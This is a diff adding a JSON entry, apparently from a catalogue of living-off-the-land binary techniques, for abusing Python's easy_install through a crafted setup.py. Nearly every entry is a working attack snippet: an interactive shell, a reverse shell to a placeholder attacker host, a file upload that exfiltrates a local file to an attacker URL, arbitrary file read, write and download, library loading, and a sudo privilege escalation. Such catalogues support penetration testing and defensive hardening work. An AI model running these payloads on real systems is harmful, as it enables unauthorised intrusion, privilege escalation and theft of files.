@@ -1,0 +1,53 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\neasy_install $TF\n"
+      }
+    ],
+    "reverse-shell": [
+      {
+        "description": "Run 'socat file:`tty`,raw,echo=0 tcp-listen:[port]' on the attacker box to receive the shell.",
+        "code": "TF=$(mktemp -d)\necho 'import sys,socket,os,pty;s=socket.socket()\ns.connect((\"[host]\",[port]))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' > $TF/setup.py\neasy_install $TF\n"
+      }
+    ],
+    "file-upload": [
+      {
+        "description": "Send local file via 'd' parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file. The file path must be absolute.",
+        "code": "TF=$(mktemp -d)\necho 'import sys;\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(\"[url]\", bytes(u.urlencode({\"d\":open(\"[file]\").read()}).encode()))' > $TF/setup.py\neasy_install $TF\n"
+      },
+      {
+        "description": "Serve files in the local folder running an HTTP server. ",
+        "code": "TF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", [port]), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py\neasy_install $TF\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "Fetch a remote file via HTTP GET request. The file path must be absolute.",
+        "code": "TF=$(mktemp -d)\necho \"import os;\nos.execl('$(whereis python)', '$(whereis python)', '-c', \\\"\\\"\\\"import sys;\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve('[url]', '[file]')\\\"\\\"\\\")\" > $TF/setup.py\npip install $TF\n"
+      }
+    ],
+    "file-write": [
+      {
+        "description": "The file path must be absolute.",
+        "code": "TF=$(mktemp -d)\necho \"import os;\nos.execl('$(whereis python)', 'python', '-c', 'open(\\\"[file]\\\",\\\"w+\\\").write(\\\"DATA\\\")')\" > $TF/setup.py\neasy_install $TF\n"
+      }
+    ],
+    "file-read": [
+      {
+        "description": "The read file content is wrapped within program messages. The file path must be absolute.",
+        "code": "TF=$(mktemp -d)\necho 'print(open(\"[file]\").read())' > $TF/setup.py\neasy_install $TF\n"
+      }
+    ],
+    "library-load": [
+      {
+        "code": "TF=$(mktemp -d)\necho 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > $TF/setup.py\neasy_install $TF\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo easy_install $TF\n"
+      }
+    ]
+  }
+}
